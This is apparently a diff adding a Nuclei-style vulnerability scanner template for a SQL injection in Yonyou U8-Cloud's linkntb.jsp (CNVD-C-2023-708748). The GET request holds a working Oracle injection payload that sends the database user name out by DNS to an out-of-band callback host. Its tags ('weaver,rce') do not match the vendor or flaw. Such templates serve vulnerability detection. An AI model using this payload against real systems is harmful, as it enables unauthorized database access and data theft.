@@ -1,0 +1,27 @@
+id: yongyouOA-U8-Cloud-linkntb-jsp-sql
+info:
+  name: 用友U8-Cloud-linkntb.jsp存在SQL注入漏洞(CNVD-C-2023-708748)
+  author: cnaq
+  severity: critical
+  description: 用友U8-Cloud-linkntb.jsp存在SQL注入漏洞(CNVD-C-2023-708748)
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-Cloud-linkntb.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CNVD-C-2023-708748).md
+  tags: weaver,rce
+
+requests:
+  - raw:
+      - |
+        GET /yer/html/nodes/linkntb/linkntb.jsp?pageId=linkntb&billId=1%27%29+and+%28select+utl_inaddr.get_host_address%28%28select+user+from+dual%29%7C%7C%27{{interactsh-url}}%27%29+from+dual%29is+not+null+--+Astq&djdl=1&rand=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/plain; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
